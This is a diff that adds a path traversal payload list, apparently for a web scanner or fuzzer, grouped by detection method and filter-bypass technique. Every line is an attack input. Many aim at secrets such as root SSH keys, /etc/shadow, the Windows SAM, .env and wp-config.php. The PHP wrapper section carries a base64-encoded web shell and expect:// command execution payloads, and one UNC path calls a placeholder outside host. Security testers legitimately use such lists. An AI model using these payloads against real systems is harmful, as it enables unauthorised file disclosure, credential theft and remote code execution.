@@ -1,0 +1,113 @@
+##Path Traversal - Error-Based##
+../../../../../../../root/.ssh/id_rsa
+..\..\..\..\..\..\windows\system32\config\SAM
+/proc/self/mem
+/dev/zero
+/nonexistent/path/file.txt
+C:\nonexistent\path\file.txt
+....//....//....//....//etc/shadow
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow
+##Path Traversal - Math-Based##
+../../../../../../../tmp/1337
+....//....//....//tmp/1337
+%2e%2e%2ftmp%2f1337
+..%2ftmp%2f1337
+##Path Traversal - Timing-Based##
+/dev/urandom
+/proc/self/fd/0
+../../../../../../../dev/random
+/proc/self/exe
+../../../../../../../proc/kmsg
+/dev/stdin
+../../../../../../../proc/self/mem
+##Path Traversal - OOB##
+....//....//....//....//proc/self/environ
+/proc/self/net/arp
+##Path Traversal - Traversal Sequences Linux##
+../etc/passwd
+../../etc/passwd
+../../../../../../../proc/self/cwd
+##Path Traversal - Traversal Sequences Windows##
+..\windows\win.ini
+..\..\windows\win.ini
+..\..\..\windows\win.ini
+..\..\..\..\windows\win.ini
+..\..\..\..\..\windows\win.ini
+..\..\..\..\..\..\windows\win.ini
+..\..\..\..\..\..\..\windows\win.ini
+..\..\..\..\..\..\..\boot.ini
+..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts
+##Path Traversal - Encoding Bypass##
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini
+..%252f..%252f..%252f..%252fetc%252fpasswd
+..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
+..%c1%9c..%c1%9c..%c1%9c..%c1%9cwindows\win.ini
+..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd
+%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+##Path Traversal - Null Byte and Normalization##
+../../../../../../../etc/passwd%00
+../../../../../../../etc/passwd%00.jpg
+../../../../../../../etc/passwd%00.png
+../../../../../../../etc/passwd%00.html
+..%00/..%00/..%00/etc/passwd
+..%0d/..%0d/..%0d/etc/passwd
+/;/../../../etc/passwd
+/.;/../../../etc/passwd
+/.%00/../../../etc/passwd
+....//....//....//....//etc/passwd
+....\/....\/....\/....\/etc/passwd
+..../\..../\..../\etc/passwd
+....//....//....//....//windows/win.ini
+##Path Traversal - Target Files##
+.env
+../.env
+../../.env
+../../../.env
+.git/config
+../.git/config
+../../.git/config
+web.config
+../web.config
+../../web.config
+WEB-INF/web.xml
+../WEB-INF/web.xml
+../../WEB-INF/web.xml
+application.properties
+../application.properties
+../../application.properties
+config/database.yml
+../config/database.yml
+../../config/database.yml
+##Path Traversal - PHP Wrappers##
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=../config.php
+php://filter/convert.base64-encode/resource=../../wp-config.php
+php://filter/read=string.rot13/resource=index.php
+php://filter/read=convert.iconv.utf-8.utf-16/resource=index.php
+php://filter/zlib.deflate/convert.base64-encode/resource=index.php
+php://input
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
+expect://id
+expect://whoami
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=php://input
+##Path Traversal - Windows UNC##
+\\{domain}\share\test
+##Path Traversal - NTFS Alternate Data Stream##
+....//....//etc/passwd::$DATA
+##Path Traversal - Windows 8.3 Short Name##
+..\..\WINDOW~1\system32\config\SAM
+##Path Traversal - Backup Files##
+.env.bak
+config.php.bak
+web.config.old
+.git/HEAD
+.svn/entries
+##Path Traversal - API Context##
+/api/v1/../../etc/passwd
+/static/../../etc/passwd
